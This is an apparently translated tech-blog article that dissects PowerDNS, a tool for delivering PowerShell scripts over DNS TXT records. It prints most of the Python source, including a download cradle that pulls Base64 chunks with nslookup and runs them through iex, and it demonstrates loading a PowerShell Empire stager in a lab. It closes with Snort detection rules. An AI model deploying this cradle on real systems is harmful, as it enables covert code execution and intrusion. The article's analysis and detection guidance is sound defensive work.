<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Powershell delivery of scripts via DNS tunnel and methods of counteraction</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In this article we will talk about a new tool that allows you to transfer Powershell scripts to a target machine inside DNS packets in order to hide t...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Powershell delivery of scripts via DNS tunnel and methods of counteraction</h1><div class="post__text post__text-html js-mediator-article"><div style="text-align:center;"><img src="https://habrastorage.org/web/015/878/384/01587838435e4967ad9d450016725cfc.jpg"></div><br>  In this article we will talk about a new tool that allows you to transfer Powershell scripts to a target machine inside DNS packets in order to hide traffic.  Let's look at how PowerDNS works and how to protect against such attacks. <br><a name="habracut"></a><br><h2>  Parsing code </h2><br>  The tool can be downloaded <a href="https://github.com/mdsecactivebreach/PowerDNS">on the official GitHub</a> . <br><br>  After cloning the repository inside you will find the file powerdns.py.  This script, written in python, in essence, consists the whole tool.  Let's see what he does. <br><br>  We study the import section 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <pre><code class="bash hljs">import scapy, sys from scapy.all import * import base64 import signal import argparse</code> </pre> <br>  Immediately pay attention to the fact that PowerDSN uses <a href="http://www.secdev.org/projects/scapy/">scapy</a> to work with network packets. <br><br>  Next we need to set the interface to listen.  Note that this option cannot be set via command line parameters. <br><br><pre> <code class="bash hljs">INTERFACE = <span class="hljs-string"><span class="hljs-string">'eth0'</span></span> chunks = [] domain = <span class="hljs-string"><span class="hljs-string">''</span></span></code> </pre> <br>  Next come the descriptions of the launch validation functions - <b>validate_args ()</b> , showing a banner from the banner.txt file - <b>show_banner ()</b> , we will not analyze them. <br><br>  The next function is more interesting - <b>base64_file (file)</b> . <br><br><pre> <code class="bash hljs">def base64_file(file): try: with open(file, <span class="hljs-string"><span class="hljs-string">"rb"</span></span>) as powershell_file: encoded_string = base64.b64encode(powershell_file.read()) <span class="hljs-built_in"><span class="hljs-built_in">return</span></span> encoded_string except: <span class="hljs-built_in"><span class="hljs-built_in">print</span></span>(<span class="hljs-string"><span class="hljs-string">"\033[1;34m[*] PowerDNS:\033[0;0m Error opening file"</span></span>) sys.exit(-1)</code> </pre><br>  It opens the file that we pass in the parameters at startup and encodes its contents in <a href="https://ru.wikipedia.org/wiki/Base64">Base64</a> . <br><br>  The following describes the <b>get_chunks (file)</b> function <b>.</b> <br><br><pre> <code class="bash hljs">def get_chunks(file): tmp_chunks = [] encoded_file = base64_file(file) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(0,len(encoded_file), 250): tmp_chunks.append(encoded_file[i:i+250]) <span class="hljs-built_in"><span class="hljs-built_in">return</span></span> tmp_chunks</code> </pre> <br>  Which breaks the Base64 payload, obtained using the base64_file function into parts of 250 characters each. <br><br>  Next comes the main function that performs the correct sending of payload inside DNS packets - <b>powerdnsHandler (data)</b> <br><br><pre> <code class="bash hljs">def powerdnsHandler(data): <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> data.haslayer(DNS) and data.haslayer(DNSQR): global chunks ip = data.getlayer(IP) udp = data.getlayer(UDP) dns = data.getlayer(DNS) dnsqr = data.getlayer(DNSQR) <span class="hljs-built_in"><span class="hljs-built_in">print</span></span>(<span class="hljs-string"><span class="hljs-string">'\033[1;34m[*] PowerDNS:\033[0;0m Received DNS Query for %s from %s'</span></span> % (dnsqr.qname, ip.src))</code> </pre> <br>  If the script receives a DNS packet, the console displays the string ‚ÄúReceived DNS Query for ...‚Äù <br><br><pre> <code class="bash hljs"> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> len(dnsqr.qname) !=0 and dnsqr.qtype == 16: try: response = chunks[int(dnsqr.qname.split(<span class="hljs-string"><span class="hljs-string">'.'</span></span>)[0])] except: <span class="hljs-built_in"><span class="hljs-built_in">return</span></span> rdata=response rcode=0 dn = domain an = (None, DNSRR(rrname=dnsqr.qname, <span class="hljs-built_in"><span class="hljs-built_in">type</span></span>=<span class="hljs-string"><span class="hljs-string">'TXT'</span></span>, rdata=rdata, ttl=1))[rcode == 0] ns = DNSRR(rrname=dnsqr.qname, <span class="hljs-built_in"><span class="hljs-built_in">type</span></span>=<span class="hljs-string"><span class="hljs-string">"NS"</span></span>, ttl=1, rdata=<span class="hljs-string"><span class="hljs-string">"ns1."</span></span>+dn) forged = IP(id=ip.id, src=ip.dst, dst=ip.src) /UDP(sport=udp.dport, dport=udp.sport) / DNS(id=dns.id, qr=1, rd=1, ra=1, rcode=rcode, qd=dnsqr, an=an, ns=ns) send(forged, verbose=0, iface=INTERFACE)</code> </pre> <br>  If the type of requested TXT record ( <a href="https://ru.wikipedia.org/wiki/%25D0%25A2%25D0%25B8%25D0%25BF%25D1%258B_%25D1%2580%25D0%25B5%25D1%2581%25D1%2583%25D1%2580%25D1%2581%25D0%25BD%25D1%258B%25D1%2585_%25D0%25B7%25D0%25B0%25D0%25BF%25D0%25B8%25D1%2581%25D0%25B5%25D0%25B9_DNS">see DNS Resource Record Types</a> ), then a payload part ( <b>chunks [int (dnsqr.qname.split ('.') [0])] is</b> sent inside the DNS packet, and that part that was query <b>dnsqr.qname</b> . <br><br>  Next comes the main body of the program. <br><br><pre> <code class="bash hljs">try: show_banner() args = validate_args() signal.signal(signal.SIGINT, signal_handler) chunks = get_chunks(args.file) domain = args.domain</code> </pre> <br>  Here, the launch is checked for correctness and the parameter values ‚Äã‚Äãare read. <br><br>  Then we see an interesting line with the variable <b>STAGER_CMD</b> <br><br><pre> <code class="bash hljs">STAGER_CMD = <span class="hljs-string"><span class="hljs-string">"for (</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">=1;</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string"> -le %s;</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">++){</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$b64</span></span></span><span class="hljs-string">+=iex(nslookup -q=txt -timeout=3 </span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$i</span></span></span><span class="hljs-string">'.%s')[-1]};iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((</span><span class="hljs-variable"><span class="hljs-string"><span class="hljs-variable">$b64</span></span></span><span class="hljs-string">))))"</span></span> % (str(len(chunks)), domain)</code> </pre> <br>  This is the powershell loader of the script that we passed in the launch parameters.  This script will be transmitted to the target machine first.  When running this script, PowerShell will loop through commands like this <br><br><pre> <code class="bash hljs">nslookup -q=txt -timeout=3 0.domain.com nslookup -q=txt -timeout=3 1.domain.com nslookup -q=txt -timeout=3 2.domain.com ...</code> </pre> <br>  And thus get the payload in parts, which are stored in the variable <b>chunks</b> . <br><br>  Further, the user is displayed on how many parts the selected powershell script has been broken.  After that, the zero index in the list is inserted Download Cradle script <b>STAGER_CMD</b> . <br><br><pre> <code class="bash hljs"> <span class="hljs-built_in"><span class="hljs-built_in">print</span></span>(<span class="hljs-string"><span class="hljs-string">"\033[1;34m[*] PowerDNS:\033[0;0m Splitting %s in to %s chunk(s)"</span></span> % (args.file, str(len(chunks)))) chunks.insert(0,STAGER_CMD)</code> </pre> <br>  To see which parts of our script was broken, you can insert after <b>chunks.insert</b> <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> j <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> chunks: <span class="hljs-built_in"><span class="hljs-built_in">print</span></span> chunks.index(j) <span class="hljs-built_in"><span class="hljs-built_in">print</span></span> j</code> </pre> <br>  The user will be shown the command to be executed on the target machine. <br><br><pre> <code class="bash hljs"> <span class="hljs-built_in"><span class="hljs-built_in">print</span></span>(<span class="hljs-string"><span class="hljs-string">"\033[1;34m[*] PowerDNS:\033[0;0m Use the following download cradle:\n\033[1;34m[*] PowerDNS:\033[0;0m powershell \"powershell (nslookup -q=txt -timeout=5 0.%s)[-1]\""</span></span> % (domain))</code> </pre> <br>  This is a view command. <br><br><pre> <code class="bash hljs">powershell <span class="hljs-string"><span class="hljs-string">"powershell (nslookup -q=txt -timeout=5 0.domain.com)[-1]"</span></span></code> </pre> <br>  Those.  Powershell will get the Download Cradle code via a TXT write request to 0.domain.com (STAGER_CMD is stored under the zero index), execute it and start the cycle of getting the main script in Base64.  We use [-1] because we need to transfer to the PowerShell the Download Cradle interpreter, and not the DNS server name, etc.  In your case, you may have to use a different line to transfer the correct part of the answer from nslookup to PowerShell. <br><br>  And the last lines of the code start listening for DNS queries on the selected interface.  When a request is received, the <b>powerdnsHandler</b> function is <b>called.</b> <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> True: mSniff = sniff(filter=<span class="hljs-string"><span class="hljs-string">"udp dst port 53"</span></span>, iface=INTERFACE, prn=powerdnsHandler) except Exception as e: sys.exit(-1)</code> </pre> <br>  If something does not work for you, I would add the code with the line print (e) before sys.exit to see execution errors. <br><br><h2>  Practical example </h2><br><br>  As a payload, i.e.  the main powershell script, I will use the <a href="https://www.powershellempire.com/">Powershell Empire</a> steager. <br><br>  I create leafer <br><br><img src="https://habrastorage.org/web/7a4/162/4bf/7a41624bf9b348a9a7f0eb54da9d94ea.PNG"><br><br>  I generate a code of a pager and I place it in the payload.ps1 file <br><br><img src="https://habrastorage.org/web/580/6cf/ea5/5806cfea589840a5a086303d296614d4.PNG"><br><br>  I have to run powerdns.py on an authoritative DNS server whose zone I control. <br>  In my test infrastructure, I use the domain sub.secret.lab.  Run on this machine PowerDNS <br><br><pre> <code class="bash hljs">python powerdns.py --file payload.ps1 --domain sub.secret.lab</code> </pre> <br>  Now I have to execute Download Cradle on a remote machine. <br><br><img src="https://habrastorage.org/web/676/6c0/296/6766c02960844e12a0ff95bcba721de4.PNG"><br><br>  After executing the powershell command, I start to see the following entries in the PowerDNS console <br><br><pre> <code class="bash hljs">[*] PowerDNS: Use the following download cradle: [*] PowerDNS: powershell <span class="hljs-string"><span class="hljs-string">"powershell (nslookup -q=txt -timeout=5 0.sub.secret.lab)[-1]"</span></span> [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 3.1.168.192.in-addr.arpa. from 192.168.1.10 [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 0.sub.secret.lab. from 192.168.1.10 [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 3.1.168.192.in-addr.arpa. from 192.168.1.10 [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 1.sub.secret.lab. from 192.168.1.10 [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 3.1.168.192.in-addr.arpa. from 192.168.1.10 [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 2.sub.secret.lab. from 192.168.1.10 [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 3.1.168.192.in-addr.arpa. from 192.168.1.10 [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 3.sub.secret.lab. from 192.168.1.10 [*] PowerDNS: Received DNS Query <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> 3.1.168.192.in-addr.arpa. from 192.168.1.10 ...</code> </pre><br>  If you run the wireshark sniffer and examine the DNS packets, we will see the following <br><br><img src="https://habrastorage.org/web/419/d73/3b2/419d733b2dbf4e59bb4b1b7e19180ce7.PNG"><br><br>  Request <br><br><img src="https://habrastorage.org/web/5fd/75f/9d5/5fd75f9d59cc4773a838de4fcd698e24.PNG"><br><br>  And the answer is (Download Cradle, which is returned when querying for 0.sub.secret.lab) <br><br><img src="https://habrastorage.org/web/897/f07/a69/897f07a6970e49099c93199da69fed5f.PNG"><br><br>  After receiving the last part of the script, we see a message in PowerShell Empire about successful connection of the agent <br><br><img src="https://habrastorage.org/web/2a0/f7c/dda/2a0f7cddad46491ea91a8669efa9c1ee.PNG"><br><br>  And, as we see, he is a worker <br><br><img src="https://habrastorage.org/web/8ae/398/75d/8ae39875d5954cf1b682e0df2c8cb0a2.PNG"><br><br><h2>  Protection </h2><br>  To block this particular script, you can search DNS lookups for the Download Cradle signature, i.e.  something like <br><br><pre> <code class="bash hljs"><span class="hljs-keyword"><span class="hljs-keyword">for</span></span> (<span class="hljs-variable"><span class="hljs-variable">$i</span></span>=1;<span class="hljs-variable"><span class="hljs-variable">$i</span></span> -le 19;<span class="hljs-variable"><span class="hljs-variable">$i</span></span>++){<span class="hljs-variable"><span class="hljs-variable">$b64</span></span>+=iex(nslookup -q=txt -timeout=3 <span class="hljs-variable"><span class="hljs-variable">$i</span></span><span class="hljs-string"><span class="hljs-string">'.sub.secret.lab'</span></span></code> </pre> <br>  The rule for network IPS Snort 2.X might look something like this <br><br><pre> <code class="bash hljs">drop udp any 53 &lt;&gt; any any (content: <span class="hljs-string"><span class="hljs-string">"| 7b 24 62 36 34 2b 3d 69 65 78 28 |"</span></span>; msg:<span class="hljs-string"><span class="hljs-string">"PowerDNS Detected!"</span></span>; sid:10000002; rev:001;)</code> </pre> <br>  Result <br><br><img src="https://habrastorage.org/web/a24/9ca/a2e/a249caa2ee4b469885adc126a48cf8be.PNG"><br><br><img src="https://habrastorage.org/web/5ad/62d/6f5/5ad62d6f5b5d412b8cfd57bc29669d77.PNG"><br><br><img src="https://habrastorage.org/web/471/6b8/0f3/4716b80f30fb4bebb61c0699c0101c4d.PNG"><br><br>  However, Download Cradle can be more complicated and obfuscated, for example with the <a href="https://github.com/danielbohannon/Invoke-CradleCrafter">Invoke-CradleCrafter</a> .  Then this rule will not work. <br><br>  In this case, you can pay attention to exceeding the threshold number of DNS queries like TXT, using a similar rule <br><br><pre> <code class="bash hljs">alert udp any any -&gt; any 53 (msg:<span class="hljs-string"><span class="hljs-string">"High TXT requests - Potential DNS Tunneling"</span></span>; content:<span class="hljs-string"><span class="hljs-string">"|00 00 10 00 01|"</span></span>; offset:12; threshold: <span class="hljs-built_in"><span class="hljs-built_in">type</span></span> threshold, track by_src, count 3, seconds 30; sid: 1000003; rev: 001;)</code> </pre> <br>  Result <br><br><img src="https://habrastorage.org/web/ad8/d75/159/ad8d751590d24dbb85e6ca37bef198c9.PNG"><br><br>  It should be borne in mind that DNS tunnels can use not only the TXT record type, so these examples demonstrate protection specifically from the PowerDNS tool.  There are a lot of tools for creating DNS tunnels, so for effective protection it is recommended to make sure that your rules protect the infrastructure from all types of tunnels. </div><p>Source: <a href="https://habr.com/ru/post/337244/">https://habr.com/ru/post/337244/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../337234/index.html">Mobile applications and their testers: all you need to know</a></li>
<li><a href="../337236/index.html">We write GraphQL API server on Yii2 with a client on Polymer + Apollo. Part 4. Validation. findings</a></li>
<li><a href="../337238/index.html">Cheat Sheet for the entrepreneur in the IT world</a></li>
<li><a href="../337240/index.html">Creating a programming language using LLVM. Part 10: Conclusion and other goodies LLVM</a></li>
<li><a href="../337242/index.html">Do you have a lot of different printers in your organization and you need to collect the number of prints from all?</a></li>
<li><a href="../337246/index.html">GitLab 9.5 Released: GPG Commit Commitments and Project Templates</a></li>
<li><a href="../337248/index.html">Case analysis with recovery of guest OS files in Veeam Backup & Replication</a></li>
<li><a href="../337250/index.html">Negotiations that work</a></li>
<li><a href="../337252/index.html">Epic Growth Conference - grocery marketing conference in Moscow</a></li>
<li><a href="../337254/index.html">Nonfictional stories about advertising budgets</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>